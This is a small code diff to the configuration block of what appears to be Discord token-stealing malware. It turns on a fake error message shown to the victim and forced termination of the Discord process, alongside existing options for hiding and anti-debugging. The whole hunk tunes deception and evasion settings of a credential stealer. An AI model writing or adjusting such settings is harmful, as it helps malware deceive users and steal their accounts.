@@ -165,9 +165,9 @@ __config__ = {
     'hide': 'yes',
     'ping': 'no',
     'pingtype': 'none',
-    'fake_error':'no',
+    'fake_error':'yes',
     'startup': 'no',
-    'kill_discord_process': False,
+    'kill_discord_process': True,
     'dbugkiller': True,
     'blprggg':
     [
